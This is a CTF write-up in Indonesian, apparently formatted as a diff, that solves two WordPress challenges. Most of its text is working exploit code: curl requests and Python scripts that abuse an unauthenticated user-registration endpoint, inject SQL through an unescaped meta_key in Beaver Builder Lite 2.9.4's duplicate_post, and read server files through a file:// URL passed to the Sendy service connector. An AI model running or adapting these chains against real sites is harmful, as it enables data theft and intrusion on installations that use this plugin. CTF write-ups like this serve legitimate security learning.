+Awalnya saya kira ini akan jadi WordPress “normal”: cari plugin vuln → upload shell → selesai. Tapi judulnya bilang *8 gate*. Jadi saya anggap seperti puzzle: buka satu gate, dapat petunjuk untuk gate berikutnya, sampai flag jatuh sendiri.
+
+---
+
+### Recon: ini benar-benar “whitebox”
+
+Hanya ada satu attachment yang diberikan:
+
+```bash
+ls -la
+unzip attachment.zip
+```
+
+Di dalamnya ada folder `server-given/` berisi `docker-compose.yml`, `.env`, dan plugin WordPress kecil.
+
+Bagian terpenting adalah `server-given/docker/wordpress/toolbox/Makefile`:
+
+```make
+$(WP_CLI) option add ${FLAG_NAME} ${FLAG_VALUE}
+```
+
+Dan `server-given/.env` mengatur:
+
+```env
+FLAG_NAME=flaggg
+FLAG_VALUE=CTF{...}
+```
+
+Artinya flag disimpan di **wp_options** sebagai:
+
+```sql
+SELECT option_value FROM wp_options WHERE option_name='flaggg';
+```
+
+Oke, ini jadi kompas: kita tidak perlu “baca file flag di server”, kita cuma perlu **membaca option itu**.
+
+Sekarang cari entry point-nya.
+
+---
+
+### Gate 1: ada endpoint registrasi user tanpa login
+
+Di `server-given/docker/wordpress/toolbox/plugins/test-plugin/test-plugin.php` ada ini:
+
+```php
+add_action("wp_ajax_nopriv_register_user", "register_user");
+
+function register_user(){
+    $userdata = array(
+        'user_login' => sanitize_text_field($_POST["username"]),
+        'user_pass' => sanitize_text_field($_POST["password"]),
+        'user_email' => sanitize_text_field($_POST["email"]),
+        'role' => 'contributor',
+    );
+
+    wp_insert_user($userdata);
+    echo "user created";
+}
+```
+
+Ini gate pertama: **siapa pun** bisa membuat akun `contributor` lewat `admin-ajax.php`.
+
+Saya pakai curl:
+
+```bash
+curl -sS -X POST 'http://18.130.76.27:9120/wp-admin/admin-ajax.php' \
+  --data 'action=register_user&username=testuser2&password=pass1234&email=testuser2%40contoh.com'
+```
+
+Output: `user created`
+
+---
+
+### Gate 2: login dan lihat apa yang bisa kita akses
+
+Login WordPress standar:
+
+```bash
+curl -sS -c /tmp/cj 'http://18.130.76.27:9120/wp-login.php' > /dev/null
+curl -sS -i -c /tmp/cj -b /tmp/cj -X POST 'http://18.130.76.27:9120/wp-login.php' \
+  --data-urlencode 'log=testuser2' \
+  --data-urlencode 'pwd=pass1234' \
+  --data-urlencode 'wp-submit=Log In' \
+  --data-urlencode 'redirect_to=http://18.130.76.27:9120/wp-admin/' \
+  --data-urlencode 'testcookie=1' | head
+```
+
+Role `contributor` memang terbatas (tidak bisa buka menu plugin/settings), tapi cukup untuk langkah berikutnya.
+
+---
+
+### Gate 3: cari “mesin” untuk membaca `wp_options`
+
+Makefile toolbox juga menginstal plugin lain:
+
+```make
+$(WP_CLI) plugin install beaver-builder-lite-version --version="2.9.4" --activate
+```
+
+Beaver Builder Lite besar—tapi challenge “whitebox” biasanya ingin kita fokus ke satu bug kecil tapi fatal.
+
+Saya download source versi yang sama untuk review dengan teliti:
+
+```bash
+curl -sSLO https://downloads.wordpress.org/plugin/beaver-builder-lite-version.2.9.4.zip
+unzip -q beaver-builder-lite-version.2.9.4.zip
+```
+
+Lalu saya cari operasi database yang “berbau” (raw query):
+
+```bash
+rg -n '\\$wpdb->query\\(' beaver-builder-lite-version/classes/class-fl-builder-model.php
+```
+
+Saya menemukannya di `FLBuilderModel::duplicate_post()`:
+
+```php
+$post_meta = $wpdb->get_results(
+  $wpdb->prepare( "SELECT meta_key, meta_value FROM {$wpdb->postmeta} WHERE post_id = %d", $post_id )
+);
+
+foreach ( $post_meta as $meta_info ) {
+  $meta_key = $meta_info->meta_key;
+  $meta_value = addslashes( $meta_info->meta_value );
+
+  // VULNERABLE: meta_key disisipkan mentah ke SQL.
+  $wpdb->query(
+    "INSERT INTO {$wpdb->postmeta} (post_id, meta_key, meta_value)
+     values ({$new_post_id}, '{$meta_key}', '{$meta_value}')"
+  );
+}
+```
+
+Poin penting:
+
+- `meta_value` di-escape (`addslashes`).
+- Tapi `meta_key` **tidak** di-escape sama sekali.
+- Kalau kita bisa membuat post meta dengan `meta_key` berisi `'` + payload SQL, kita bisa *membengkokkan* query insert ini.
+
+Sekarang pertanyaannya: sebagai `contributor`, gimana cara menyuntikkan `meta_key` yang aneh?
+
+---
+
+### Gate 4: XML-RPC = jalur “custom_fields” yang mudah untuk injeksi meta
+
+WordPress masih mengaktifkan XML-RPC (`/xmlrpc.php`), dan `contributor` bisa pakai `wp.newPost` untuk membuat draft.
+
+Bagian menariknya: XML-RPC mendukung `custom_fields` → ini langsung membuat entri di `wp_postmeta` dengan `meta_key` pilihan kita.
+
+Saya buat draft post dengan `meta_key` yang sudah “disiapkan” untuk SQLi:
+
+Payload `meta_key`:
+
+```text
+a', (SELECT option_value FROM wp_options WHERE option_name='flaggg'))#
+```
+
+Kenapa ini bekerja?
+
+- Kita menutup string `'{$meta_key}'` dengan `'` setelah `a`.
+- Kita mengubah `meta_value` menjadi hasil `SELECT option_value ...`.
+- Kita comment sisanya dengan `#` supaya `', '{$meta_value}')` tidak mengganggu.
+
+Script Python (xmlrpc) yang saya buat:
+
+```py
+import xmlrpc.client
+
+url = 'http://18.130.76.27:9120/xmlrpc.php'
+user = 'testuser2'
+pw = 'pass1234'
+client = xmlrpc.client.ServerProxy(url, allow_none=True)
+
+inj = "a', (SELECT option_value FROM wp_options WHERE option_name='flaggg'))#"
+
+post = {
+  'post_type': 'post',
+  'post_status': 'draft',
+  'post_title': 'gate-setup',
+  'post_content': 'x',
+  'custom_fields': [{'key': inj, 'value': '1'}],
+}
+
+post_id = client.wp.newPost(1, user, pw, post)
+print('post_id', post_id)
+```
+
+```bash
+python3 post.py
+post_id 23525
+```
+
+Sampai sini, meta berbahayanya sudah ada… tapi **belum tereksekusi**. Dia baru “meledak” ketika `duplicate_post()` dipanggil.
+
+---
+
+### Gate 5: trigger `duplicate_post()` lewat Beaver Builder front-end AJAX
+
+Beaver Builder punya “frontend AJAX” sendiri (`FLBuilderAJAX`) yang butuh nonce bernama `fl_ajax_update`.
+
+Ternyata noncenya bisa diambil dari halaman UI builder:
+
+```bash
+curl -sS -L -b /tmp/cj 'http://18.130.76.27:9120/?p=23525&fl_builder' \
+  | rg -n 'FLBuilderConfig\\s*=|ajaxNonce' | head
+```
+
+Ada snippet seperti:
+
+```js
+FLBuilderConfig = {
+  ...,
+  "ajaxNonce":"903aacf254",
+  ...
+};
+```
+
+Ini adalah “kunci gate” untuk mengeksekusi aksi builder.
+
+Untuk memicu duplikasi:
+
+```bash
+curl -sS -b /tmp/cj -X POST 'http://18.130.76.27:9120/' \
+  --data 'post_id=23525&fl_action=duplicate_post&_wpnonce=903aacf254'
+```
+
+Responsnya adalah post ID baru (contoh: `291`).
+
+Dan di titik itu `duplicate_post()` meng-copy semua postmeta dari post 288 → 291, termasuk meta_key yang kita buat… jadi raw query `INSERT ... '{$meta_key}' ...` berubah menjadi versi kita dari “statement SQL”.
+
+---
+
+### Gate 6: baca hasilnya (flag) lewat XML-RPC
+
+Sekarang post hasil duplikasi (`291`) punya custom field `a` yang nilainya bukan `1`, tapi hasil subquery dari `wp_options`:
+
+```py
+import xmlrpc.client
+
+url = 'http://18.130.76.27:9120/xmlrpc.php'
+user = 'testuser2'
+pw = 'pass1234'
+client = xmlrpc.client.ServerProxy(url, allow_none=True)
+
+post = client.wp.getPost(1, user, pw, 291)
+for cf in post.get('custom_fields', []):
+    if cf.get('key') == 'a':
+        print(cf['value'])
+```
+
+Output:
+
+```text
+CTF{red_flare_is_all_i_got_8892103492122}
+```
+
+Game over. Semua 8 gate kebuka.
+
+### Flag
+
+`CTF{red_flare_is_all_i_got_8892103492122}`
+
+---
+
+## Izanami
+
+Target: `http://18.130.76.27:9131/`
+
+### Intro
+
+Di write-up ini saya ceritakan alurnya seperti cerita heist: mulai dari recon (mengendus WordPress), menemukan pintu samping (registrasi user via AJAX tanpa nonce), naik level menjadi user yang login, lalu “mencuri master key” lewat Beaver Builder Service → Sendy, yang ternyata bisa dipaksa membaca `file://`.
+
+Penutupnya sederhana dan memuaskan: **flag dibaca langsung dari filesystem**.
+
+---
+
+### Recon: WordPress, plugin, dan kebiasaan “lupa ngunci”
+
+Karena ini white-box, saya mulai dari artefak yang diberikan: `attachment.zip`.
+
+```bash
+ls -la
+unzip attachment.zip
+```
+
+Isi zip mengarah ke setup WordPress + beberapa plugin. Biar cepat, saya pakai `ripgrep` untuk mencari sesuatu yang “berbahaya tapi umum”: `wp_ajax_nopriv_`.
+
+```bash
+rg -n "wp_ajax_nopriv_" -S extracted | head -n 50
+```
+
+Dan saya menemukan jackpot kecil di plugin kustom:
+
+- `extracted/server-given/docker/wordpress/toolbox/plugins/test-plugin/test-plugin.php`
+
+```php
+add_action("wp_ajax_nopriv_register_user", "register_user");
+
+function register_user(){
+    $userdata = array(
+        'user_login' => sanitize_text_field($_POST["username"]),
+        'user_pass' => sanitize_text_field($_POST["password"]),
+        'user_email' => sanitize_text_field($_POST["email"]),
+        'role' => 'contributor',
+    );
+
+    wp_insert_user($userdata);
+    echo "user created";
+}
+```
+
+Dari sini sudah jelas:
+
+- `nopriv` → bisa dipanggil tanpa login.
+- tidak ada nonce, tidak ada captcha, tidak ada rate limit.
+- langsung memanggil `wp_insert_user()` dengan role `contributor`.
+
+Jadi “infinite loop”-nya? Jangan kebanyakan mikir. Pertama, buat user kita sendiri.
+
+Endpoint-nya WordPress standar:
+
+`POST /wp-admin/admin-ajax.php?action=register_user`
+
+---
+
+### Masuk dulu: buat akun contributor (tanpa izin)
+
+Request paling minimal:
+
+```bash
+curl -i -s -X POST 'http://18.130.76.27:9131/wp-admin/admin-ajax.php' \
+  -d 'action=register_user' \
+  -d 'username=u1337' \
+  -d 'password=p1337' \
+  -d 'email=u1337@example.com'
+```
+
+Kalau sukses, responsnya “user created”.
+
+Setelah itu, login normal lewat:
+
+`POST /wp-login.php` (field form `log` dan `pwd`).
+
+Sampai sini kita “cuma” contributor. Bukan admin, tidak bisa install plugin, tapi cukup untuk langkah berikutnya: **akses Beaver Builder frontend AJAX**.
+
+---
+
+### Kenapa Beaver Builder relevan?
+
+Di codebase, ada Beaver Builder Lite (versi yang umum dipakai). Secara remote, biasanya bisa dicek lewat:
+
+`/wp-content/plugins/beaver-builder-lite-version/readme.txt`
+
+Yang penting bukan cuma versinya—tapi fitur “Services”. Beaver Builder punya sistem integrasi pihak ketiga (Mailchimp, Sendy, dll) yang bisa di-*connect* lewat AJAX action bernama `connect_service`.
+
+Di source:
+
+- `plugin_src/beaver/beaver-builder-lite-version/classes/class-fl-builder-ajax.php`
+- `plugin_src/beaver/beaver-builder-lite-version/classes/class-fl-builder-services.php`
+
+Alurnya singkat:
+
+1) Frontend AJAX handler jalan di hook `wp` (bukan `wp-admin/admin-ajax.php`):
+
+```php
+add_action( 'wp', __CLASS__ . '::run' );
+```
+
+2) Ada guard:
+
+- harus login
+- harus punya nonce `fl_ajax_update`
+- harus bisa `edit_post` untuk `post_id` yang dipakai
+
+3) Lalu dispatch ke `FLBuilderServices::connect_service`.
+
+Dan ini kenapa kita bisa main sebagai contributor: contributor bisa bikin draft post sendiri → otomatis punya capability `edit_post` untuk post itu.
+
+Jadi strateginya:
+
+1) Buat draft post
+2) Ambil nonce Beaver Builder (`ajaxNonce`)
+3) Panggil `connect_service` sambil *nyelipin* payload
+
+---
+
+### Bug utama: “SSRF” yang berubah jadi arbitrary read `file://`
+
+Service yang paling gampang disalahgunakan di sini adalah **Sendy**.
+
+Di Beaver Builder, class-nya:
+
+- `plugin_src/beaver/beaver-builder-lite-version/classes/services/class-fl-builder-service-sendy.php`
+
+Di vendor library-nya (SendyPHP), isu intinya sederhana: dia pakai cURL ke `$installation_url`… tanpa membatasi protokol.
+
+Secara konsep:
+
+```php
+$ch = curl_init($installation_url . '/' . $type);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$resp = curl_exec($ch);
+```
+
+Kalau kita set `$installation_url` ke `file:///etc/passwd#`, cURL akan mencoba “request” file lokal di server. Output (isi file) balik sebagai `$resp`.
+
+Lebih lucu lagi: saat koneksinya dianggap gagal, pesan error Beaver Builder ujungnya “membawa” respons itu. Jadi isi file bocor lewat string error JSON.
+
+Ini murni: **payload → cURL → string error → kita baca**.
+
+---
+
+### Exploit chain (end-to-end) — bagian kunci: nonce + post_id
+
+Karena Beaver Builder frontend AJAX butuh nonce `fl_ajax_update`, kita butuh dua nonce:
+
+1) Nonce WordPress REST API (`wpApiSettings.nonce`) untuk membuat draft post lewat `/wp-json/wp/v2/posts`
+2) Nonce Beaver Builder (`FLBuilderConfig.ajaxNonce`) untuk memanggil `connect_service`
+
+Di bawah ini script Python yang melakukan semuanya:
+
+```py
+import json, re, secrets
+import requests
+
+BASE = "http://18.130.76.27:9131"
+FLAG_PATH = "/flag-7hW4jxYnFouPxRhWLhVp.txt"
+
+s = requests.Session()
+
+# 1) register contributor (unauth)
+username = "u" + secrets.token_hex(4)
+password = "p" + secrets.token_hex(8)
+email = f"{username}@example.com"
+s.post(f"{BASE}/wp-admin/admin-ajax.php", data={
+  "action":"register_user",
+  "username": username,
+  "password": password,
+  "email": email,
+})
+
+# 2) login
+s.get(f"{BASE}/wp-login.php")
+s.post(f"{BASE}/wp-login.php", data={
+  "log": username,
+  "pwd": password,
+  "wp-submit": "Log In",
+  "redirect_to": f"{BASE}/wp-admin/",
+  "testcookie": "1",
+})
+
+# 3) grab REST nonce
+html = s.get(f"{BASE}/wp-admin/post-new.php").text
+wp_api = json.loads(re.search(r"wpApiSettings\\s*=\\s*(\\{.*?\\});", html, re.S).group(1))
+wp_nonce = wp_api["nonce"]
+
+# 4) create draft post (so we can edit it)
+r = s.post(f"{BASE}/wp-json/wp/v2/posts",
+           headers={"X-WP-Nonce": wp_nonce, "Content-Type":"application/json"},
+           data=json.dumps({"title":"x","content":"x","status":"draft"}))
+post_id = r.json()["id"]
+
+# 5) grab Beaver Builder ajaxNonce
+html = s.get(f"{BASE}/?p={post_id}&fl_builder").text
+ajax_nonce = re.search(r"\"ajaxNonce\"\\s*:\\s*\"([^\"]+)\"", html).group(1)
+
+# 6) file:// read via Sendy connect_service
+service_account = "pwn" + secrets.token_hex(3)
+resp = s.post(f"{BASE}/?p={post_id}&fl_builder", data={
+  "fl_action": "connect_service",
+  "_wpnonce": ajax_nonce,
+  "fl_builder_data[post_id]": str(post_id),
+  "fl_builder_data[service]": "sendy",
+  "fl_builder_data[fields][service_account]": service_account,
+  "fl_builder_data[fields][api_host]": f"file://{FLAG_PATH}#",
+  "fl_builder_data[fields][api_key]": "x",
+  "fl_builder_data[fields][list_id]": "x",
+}).json()
+
+print(resp["error"])  # contains file contents
+```
+
+Jalankan:
+
+```bash
+python3 solve.py
+```
+
+Kalau targetnya sama, output error akan berisi flag.
+
+---
+
+### Twist kecil yang lucu: “nama flag” ketemu dari directory listing
+
+Sebelum membaca flag, saya coba “search root directory” dulu:
+
+`file:///` sering mengembalikan teks directory listing (tergantung wrapper & build). Dan di kasus ini listing-nya terbaca, jadi nama file flag langsung kelihatan:
+
+`flag-7hW4jxYnFouPxRhWLhVp.txt`
+
+Setelah dapat namanya, tinggal baca file dengan payload `file:///flag-...txt#`.
+
+---
+
+### Flag
+
+`CTF{can_you_break_this_infinite_loop_645271829bdbd}`
+
+---
